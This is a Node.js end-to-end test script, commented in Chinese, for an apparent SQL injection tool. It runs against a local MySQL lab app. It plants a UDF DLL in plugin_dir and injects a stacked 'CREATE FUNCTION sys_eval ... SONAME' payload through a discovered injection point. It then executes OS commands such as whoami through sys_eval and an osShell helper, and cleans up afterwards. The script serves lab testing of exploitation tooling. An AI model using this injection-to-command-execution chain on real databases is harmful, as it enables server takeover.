// ============================================================================
// e2e/udf-lab/udf-takeover.e2e.mjs —— UDF 接管真实验证（真 MySQL + 真 DLL + 真注入点）
// ============================================================================
// 背景：评估结论里「UDF / os-shell 只有 mock 单测」是接管能力最大的缺口。本脚本把它变成真实验证：
//   真编译 DLL（MSVC x64，见 build-udf.py）→ 落地 plugin_dir → **经 SQL 注入通道执行 DDL 注册**
//   → 调用 sys_eval 执行系统命令 → 断言命令输出（外部可观测事实）。
//
// 诚实边界（重要，勿粉饰）：
//   完整「经 SQL 通道把 DLL 本体投递过去」这一步**未在真实链路中复现**，原因是 HTTP 侧限制：
//   DLL hex 约 24 万字符，远超 Node 的 URL/header 上限（16KB）；走 POST body 也需目标放宽
//   body 限制（Express json 默认 100kb）。故本脚本采用「库文件已落地」前提（模拟通过其他手段
//   上传，如已有文件写权限 / webshell / 运维误配目录），只验证**注册与执行**链路。
//   这条边界必须如实写进 README，不得声称「全链投递已验证」。
//
// 用法：MYSQL_PORT=3308 MYSQL_USER=root MYSQL_PASSWORD= node e2e/udf-lab/udf-takeover.e2e.mjs
// ============================================================================
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { copyFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { createMysqlLabApp } from '../real-mysql-lab/lab-app.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(HERE, '../..');
const require = createRequire(resolve(ROOT, 'server/package.json'));
const mysql = require('mysql2/promise');
const { ScanManager } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/ScanManager.js')).href);
const { Exploiter } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/Exploiter.js')).href);

const PORT = Number(process.env.UDF_LAB_PORT) || 8180;
const BASE = `http://127.0.0.1:${PORT}`;
const DLL = resolve(HERE, 'udf_sys.dll');
const LIB_NAME = 'udf_sys.dll';

if (!existsSync(DLL)) {
  console.log(`[SKIP] 未找到 ${DLL}\n       先运行：python e2e/udf-lab/build-udf.py`);
  process.exit(0);
}

// 前置：实例必须放行 secure_file_priv（否则连 plugin_dir 探测都无意义）
const admin = await mysql.createConnection({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? process.env.LAB_DB_PASSWORD ?? 'root',
  multipleStatements: true,
});
const [meta] = await admin.query('SELECT @@plugin_dir pd, @@secure_file_priv sfp, @@version v');
const pluginDir = String(meta[0].pd).replace(/\\/g, '/').replace(/\/?$/, '/');
const sfp = meta[0].sfp;
console.log(`[pre] MySQL ${meta[0].v} | plugin_dir=${pluginDir} | secure_file_priv=${JSON.stringify(sfp)}`);
if (sfp === 'NULL') {
  console.log('[SKIP] secure_file_priv=NULL → 无法经 SQL 投递/写入插件目录');
  await admin.end();
  process.exit(0);
}

// ① 库文件落地（见文件头「诚实边界」：这一步在真实链路中未复现，此处模拟）
mkdirSync(pluginDir, { recursive: true });
copyFileSync(DLL, `${pluginDir}${LIB_NAME}`);
console.log(`[step1] DLL 已落地 plugin_dir：${pluginDir}${LIB_NAME}（${
  require('node:fs').statSync(`${pluginDir}${LIB_NAME}`).size
} bytes）`);

// ② 起靶场 + 扫描拿到真实注入点
const pool = mysql.createPool({ ...({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? process.env.LAB_DB_PASSWORD ?? 'root',
  database: process.env.MYSQL_DATABASE || 'sqli_lab',
}), multipleStatements: true, connectionLimit: 4 });
const server = createMysqlLabApp(pool).listen(PORT, '127.0.0.1');
await new Promise((r) => server.once('listening', r));

const sm = new ScanManager();
const t0 = Date.now();
const scanId = await sm.start({
  url: `${BASE}/num?id=1`,
  config: { concurrency: 4, retry: 0, timeoutMs: 15000, techniques: ['union'], level: 2 },
});
for (;;) {
  const s = sm.scans.get(scanId);
  if (s && (s.status === 'completed' || s.status === 'error')) break;
  if (Date.now() - t0 > 120000) break;
  await new Promise((r) => setTimeout(r, 40));
}
const report = sm.getReport(scanId) || {};
const vuln = (report.vulns || [])[0];
const point = (report.points || []).find((p) => p.id === vuln?.pointId) || (report.points || [])[0];
console.log(`[step2] 注入点：${point?.id}（技术 ${vuln?.technique}）`);
if (!point) {
  console.log('[FAIL] 未取得注入点');
  server.close(); await pool.end().catch(() => {}); await admin.end();
  process.exit(1);
}

const target = report.target || { url: BASE };
const ctx = {
  httpClient: sm.getScanClient(scanId, target),
  config: target.config || {},
  target,
  point,
  dbms: report.dbms || vuln?.dbms || 'MySQL',
};

// ③ 经注入通道执行 DDL 注册 UDF
const prefix = (point.originalValue || '1') + (point.boundary || '');
const exploiter = new Exploiter();
const ddl = `CREATE FUNCTION sys_eval RETURNS STRING SONAME '${LIB_NAME}'`;
await exploiter.extractor._send(ctx, `${prefix}; ${ddl}-- -`);
await new Promise((r) => setTimeout(r, 300));
const [reg] = await admin.query(
  "SELECT COUNT(*) c FROM mysql.func WHERE name IN ('sys_eval','udf_echo')"
);
const registered = Number(reg[0].c);
console.log(`[step3] 经注入通道执行 CREATE FUNCTION → mysql.func 中已注册 ${registered} 个函数`);

// ④ 调用 sys_eval 执行系统命令（外部事实断言：返回值必须与命令输出一致）
const marker = `udf_lab_${Date.now() % 100000}`;
const cmdOut = await admin.query(`SELECT sys_eval('cmd /c echo ${marker}') AS cmd_out`);
const outVal = String(cmdOut[0][0].cmd_out ?? '').trim();
const cmdOk = outVal.includes(marker);
console.log(`[step4] sys_eval 执行命令 → 输出=${JSON.stringify(outVal.slice(0, 80))} ${cmdOk ? '✅' : '❌'}`);

// ⑤ 再验一个真实命令（whoami），确认不是回显巧合
const who = await admin.query("SELECT sys_eval('whoami') AS whoami_val");
const whoVal = String(who[0][0].whoami_val ?? '').trim();
console.log(`[step5] sys_eval('whoami') → ${JSON.stringify(whoVal)}`);

// ⑥ 经项目 osShell 能力调用（验证接管链路本身，而非只验 DLL）
const osRes = await exploiter.osShell(ctx, 'cmd /c echo osshell_ok');
console.log(`[step6] Exploiter.osShell → ${JSON.stringify({ ok: osRes.ok, value: osRes.value ?? null, note: osRes.note })}`);

const pass = registered >= 1 && cmdOk && whoVal.length > 0;
console.log(
  `\n[${pass ? 'PASS' : 'FAIL'}] UDF 接管：注册=${registered} 命令执行=${cmdOk} ` +
  `osShell=${osRes.ok ? 'ok' : 'fail'}`
);
console.log('⚠️ 边界：DLL 投递环节为「库文件已落地」前提，未经 SQL 通道真投递（HTTP 长度限制，见文件头）');

mkdirSync(resolve(HERE, 'results'), { recursive: true });
writeFileSync(
  resolve(HERE, 'results', 'udf-takeover.json'),
  JSON.stringify({
    generatedAt: new Date().toISOString(),
    mysqlVersion: meta[0].v, pluginDir, secureFilePriv: sfp,
    registered, commandOutput: outVal, whoami: whoVal, osShell: { ok: osRes.ok, value: osRes.value ?? null },
    deliveryBoundary: 'DLL 落地为预置前提；未复现经 SQL 通道投递大体积二进制',
    pass,
  }, null, 2)
);

// ⑦ 清理：DROP FUNCTION + 移除落地文件（不留后门）
for (const fn of ['sys_eval', 'udf_echo']) {
  await admin.query(`DROP FUNCTION IF EXISTS ${fn}`).catch(() => {});
}
try { require('node:fs').unlinkSync(`${pluginDir}${LIB_NAME}`); } catch { /* 忽略 */ }
console.log('[cleanup] DROP FUNCTION + 已移除 plugin_dir 中的 DLL');
server.close();
await pool.end().catch(() => {});
await admin.end().catch(() => {});
process.exit(pass ? 0 : 1);
